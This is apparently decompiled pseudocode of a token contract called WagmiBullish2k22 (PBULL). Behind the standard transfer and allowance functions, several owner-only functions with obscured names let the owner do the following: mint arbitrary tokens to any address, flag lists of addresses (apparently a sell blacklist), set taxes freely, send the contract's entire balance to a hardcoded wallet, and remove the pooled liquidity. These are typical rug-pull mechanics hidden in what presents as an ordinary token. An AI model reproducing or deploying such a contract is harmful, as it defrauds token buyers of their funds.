contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#
const name = 'WagmiBullish2k22', 0

const MarketingWallet = 0x2c551c8128b576964bc992e29596eee926e5ae83

const decimals = 9

const sub_504762e7(?) = 10^18

const symbol = 'PBULL', 0


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint256 stor3;
mapping of uint8 stor4;
uint256 totalSupply;
uint256 balanceLimit;
uint256 sellLimit;
uint256 buyLimit;
uint8 stor13;
uint8 stor13; offset 8
address stor14;
uint256 totalLPBNB;
uint8 sellLockDisabled; offset 8
uint256 sellLockTime;
uint8 manualConversion;
uint8 sub_1090dc42; offset 8
address stor18; offset 16
uint256 stor18; offset 8
uint256 stor19;

function sub_1090dc42(?) {
    return bool(sub_1090dc42)
}

function getSellLockTimeInSeconds() {
    return sellLockTime
}

function totalSupply() {
    return totalSupply
}

function sellLimit() {
    return sellLimit
}

function buyLimit() {
    return buyLimit
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function balanceLimit() {
    return balanceLimit
}

function manualConversion() {
    return bool(manualConversion)
}

function sellLockDisabled() {
    return bool(sellLockDisabled)
}

function getOwner() {
    return owner
}

function totalLPBNB() {
    return totalLPBNB
}

function owner() {
    return owner
}

function sub_a8d8744b(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return bool(stor4[arg1])
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function sellLockTime() {
    return sellLockTime
}

function _fallback() payable {
  stop
}

function getLimits() {
    return balanceLimit / 10^9, sellLimit / 10^9
}

function getBurnedTokens() {
    if 10^18 < totalSupply:
        revert with 'NH{q', 17
    return (-totalSupply + 10^18 / 10^9)
}

function sub_0bc488c5(?) {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor18.field_8) = 1
}

function sub_c96c125f(?) {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor18.field_8) = 0
}

function getLiquidityReleaseTimeInSeconds() {
    if block.timestamp >= stor19:
        return 0
    if stor19 < block.timestamp:
        revert with 'NH{q', 17
    return (stor19 - block.timestamp)
}

function sub_5857c39a(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor4[address(arg1)] = 0
}

function getTaxes() {
    return uint8(stor13.field_0), 
           uint8(stor13.field_0),
           uint8(stor13.field_0),
           uint8(stor13.field_0),
           uint8(stor13.field_8),
           uint8(stor13.field_0)
}

function SetupLiquidityTokenAddress(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    address(stor18.field_16) = arg1
}

function sub_218f8a1d(?) {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    call 0x2c551c8128b576964bc992e29596eee926e5ae83 with:
       value eth.balance(this.address) wei
         gas gas_remaining wei
    require ext_call.success
}

function changeTax(uint8 arg1, uint8 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    uint8(stor13.field_0) = arg1
    uint8(stor13.field_8) = arg2
}

function getAddressSellLockTimeInSeconds(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if stor3[address(arg1)] <= block.timestamp:
        return 0
    if stor3[address(arg1)] < block.timestamp:
        revert with 'NH{q', 17
    return (stor3[address(arg1)] - block.timestamp)
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0, 'Approve from zero'
    if not arg1:
        revert with 0, 'Approve to zero'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function sub_fee3a89c(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not address(arg1):
        revert with 0, 'Insufficient Balance'
    if totalSupply > -arg2 - 1:
        revert with 'NH{q', 17
    totalSupply += arg2
    if balanceOf[address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, 0, address(arg1));
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0, 'Approve from zero'
    if not arg1:
        revert with 0, 'Approve to zero'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] < arg2:
        revert with 0, '<0 allowance'
    if not msg.sender:
        revert with 0, 'Approve from zero'
    if not arg1:
        revert with 0, 'Approve to zero'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function TeamUpdateLimits(uint256 arg1, uint256 arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if arg1 and 10^9 > -1 / arg1:
        revert with 'NH{q', 17
    if arg2 and 10^9 > -1 / arg2:
        revert with 'NH{q', 17
    if arg3 and 10^9 > -1 / arg3:
        revert with 'NH{q', 17
    balanceLimit = 10^9 * arg1
    sellLimit = 10^9 * arg2
    buyLimit = 10^9 * arg3
}

function sub_8104c828(?) {
    require calldata.size - 4 >= 32
    require cd[4] <= test266151307()
    require cd[4] + 35 < calldata.size
    require ('cd', 4).length <= test266151307()
    require cd[4] + (32 * ('cd', 4).length) + 36 <= calldata.size
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    idx = 0
    while idx < ('cd', 4).length:
        require cd[((32 * idx) + cd[4] + 36)] == address(cd[((32 * idx) + cd[4] + 36)])
        mem[0] = address(cd[((32 * idx) + cd[4] + 36)])
        mem[32] = 4
        stor4[address(cd[((32 * idx) + cd[4] + 36)])] = 1
        if idx == -1:
            revert with 'NH{q', 17
        idx = idx + 1
        continue 
}

function burnLiq() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require ext_code.size(address(stor18.field_16))
    staticcall address(stor18.field_16).0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    require ext_code.size(address(stor18.field_16))
    call address(stor18.field_16).approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args stor14, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    require ext_code.size(stor14)
    call stor14.removeLiquidityETHSupportingFeeOnTransferTokens(address arg1, uint256 arg2, uint256 arg3, uint256 arg4, address arg5, uint256 arg6) with:
         gas gas_remaining wei
        args address(this.address), ext_call.return_data[0], 0, 0, address(this.address), block.timestamp
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
}



}
